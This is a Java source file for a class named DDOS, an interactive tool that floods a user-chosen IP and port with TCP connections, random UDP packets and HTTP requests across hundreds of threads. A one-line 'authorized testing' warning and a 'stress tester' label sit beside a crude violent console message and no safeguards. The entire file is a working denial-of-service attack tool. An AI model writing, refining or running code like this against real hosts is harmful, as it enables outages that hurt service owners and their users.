import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.*;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class DDOS {

    private final String targetIp;
    private final int port;
    private final int duration;
    private final int threadsPerVector;
    private final AtomicBoolean isRunning = new AtomicBoolean(false);

    private ExecutorService tcpExecutor;
    private ExecutorService udpExecutor;
    private ExecutorService httpExecutor;

    public DDOS(String targetIp, int port, int duration, int threadsPerVector) {
        this.targetIp = targetIp;
        this.port = port;
        this.duration = duration;
        this.threadsPerVector = threadsPerVector;
    }

    public void start() {
        System.out.println("Starting MAXIMAL stress test...");
        System.out.printf("Target: %s:%d\n", targetIp, port);
        System.out.printf("Duration: %d seconds\n", duration);
        System.out.printf("Threads per vector: %d\n", threadsPerVector);
        System.out.println("Raping the target with TCP, UDP, and HTTP floods...");
        System.out.println("------------------------------------------");
        System.out.println("Press CTRL+C to stop the test.");

        isRunning.set(true);
        
        tcpExecutor = Executors.newFixedThreadPool(threadsPerVector, r -> new Thread(r, "TCP-Flood-Thread"));
        udpExecutor = Executors.newFixedThreadPool(threadsPerVector, r -> new Thread(r, "UDP-Flood-Thread"));
        httpExecutor = Executors.newFixedThreadPool(threadsPerVector / 2, r -> new Thread(r, "HTTP-Flood-Thread"));

        for (int i = 0; i < threadsPerVector; i++) {
            tcpExecutor.execute(this::tcpFloodLoop);
            udpExecutor.execute(this::udpFloodLoop);
        }
        for (int i = 0; i < threadsPerVector / 2; i++) {
            httpExecutor.execute(this::httpFloodLoop);
        }

        Runtime.getRuntime().addShutdownHook(new Thread(this::stop));

        try {
            Thread.sleep(duration * 1000L);
        } catch (InterruptedException e) {
            // User interrupted
        } finally {
            stop();
        }
    }

    public void stop() {
        if (isRunning.compareAndSet(true, false)) {
            System.out.println("\nStopping stress test...");
            tcpExecutor.shutdownNow();
            udpExecutor.shutdownNow();
            httpExecutor.shutdownNow();
            try {
                if (!tcpExecutor.awaitTermination(5, TimeUnit.SECONDS)) tcpExecutor.shutdownNow();
                if (!udpExecutor.awaitTermination(5, TimeUnit.SECONDS)) udpExecutor.shutdownNow();
                if (!httpExecutor.awaitTermination(5, TimeUnit.SECONDS)) httpExecutor.shutdownNow();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            System.out.println("Test stopped.");
        }
    }

    private void tcpFloodLoop() {
        while (isRunning.get()) {
            try {
                AsynchronousSocketChannel channel = AsynchronousSocketChannel.open();
                channel.connect(new InetSocketAddress(targetIp, port), null, new CompletionHandler<Void, Void>() {
                    @Override
                    public void completed(Void result, Void attachment) {
                        try {
                            channel.close();
                        } catch (IOException ignored) {}
                        if (isRunning.get()) {
                            tcpFloodLoop();
                        }
                    }

                    @Override
                    public void failed(Throwable exc, Void attachment) {
                        try {
                            channel.close();
                        } catch (IOException ignored) {}
                        if (isRunning.get()) {
                            tcpFloodLoop();
                        }
                    }
                });
                Thread.sleep(1);
            } catch (IOException | InterruptedException e) {
                // Loop again
            }
        }
    }

    private void udpFloodLoop() {
        Random rand = new Random();
        byte[] buffer = new byte[1024];
        InetAddress targetAddress;
        try {
            targetAddress = InetAddress.getByName(targetIp);
        } catch (UnknownHostException e) {
            System.err.println("Could not resolve target IP for UDP flood.");
            return;
        }

        try (DatagramSocket socket = new DatagramSocket()) {
            while (isRunning.get()) {
                rand.nextBytes(buffer);
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, port);
                try {
                    socket.send(packet);
                } catch (IOException e) {
                    // Ignore send errors and continue
                }
            }
        } catch (SocketException e) {
            System.err.println("Failed to create DatagramSocket for UDP flood.");
        }
    }

    private void httpFloodLoop() {
        while (isRunning.get()) {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress(targetIp, port), 2000);
                OutputStream out = socket.getOutputStream();
                InputStream in = socket.getInputStream();

                String request = "GET /?" + System.currentTimeMillis() + " HTTP/1.1\r\n" +
                                 "Host: " + targetIp + "\r\n" +
                                 "User-Agent: Mozilla/5.0 (StressTester)\r\n" +
                                 "Connection: close\r\n\r\n";
                
                out.write(request.getBytes());
                out.flush();

                byte[] responseBuffer = new byte[1024];
                while (in.read(responseBuffer) > 0) {
                    // Read until the stream is closed by the server
                }

            } catch (IOException e) {
                // Connection failed, timed out, or was refused. This is expected.
            }
        }
    }

    // --- Interactive Main Method ---
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        String ip;
        int port, duration, threads;

        System.out.println("--- Interactive Network Stress Tester ---");
        System.out.println("WARNING: For educational and authorized testing ONLY.");
        System.out.println("------------------------------------------");

        // Get Target IP
        while (true) {
            System.out.print("Enter target IP or hostname: ");
            ip = scanner.nextLine();
            if (ip != null && !ip.trim().isEmpty()) {
                break;
            }
            System.out.println("Invalid input. Please enter a valid IP or hostname.");
        }

        // Get Target Port
        while (true) {
            System.out.print("Enter target port (e.g., 80, 443, 8080): ");
            try {
                port = Integer.parseInt(scanner.nextLine());
                if (port > 0 && port <= 65535) {
                    break;
                }
                System.out.println("Port must be between 1 and 65535.");
            } catch (NumberFormatException e) {
                System.out.println("Invalid input. Please enter a number.");
            }
        }

        // Get Duration
        while (true) {
            System.out.print("Enter test duration in seconds: ");
            try {
                duration = Integer.parseInt(scanner.nextLine());
                if (duration > 0) {
                    break;
                }
                System.out.println("Duration must be a positive number.");
            } catch (NumberFormatException e) {
                System.out.println("Invalid input. Please enter a number.");
            }
        }

        // Get Thread Count
        while (true) {
            System.out.print("Enter number of threads per vector (e.g., 200, 500): ");
            try {
                threads = Integer.parseInt(scanner.nextLine());
                if (threads > 0) {
                    break;
                }
                System.out.println("Thread count must be a positive number.");
            } catch (NumberFormatException e) {
                System.out.println("Invalid input. Please enter a number.");
            }
        }

        scanner.close();
        System.out.println("\nConfiguration complete. Starting test...");

        DDOS tester = new DDOS(ip, port, duration, threads);
        tester.start();
    }
}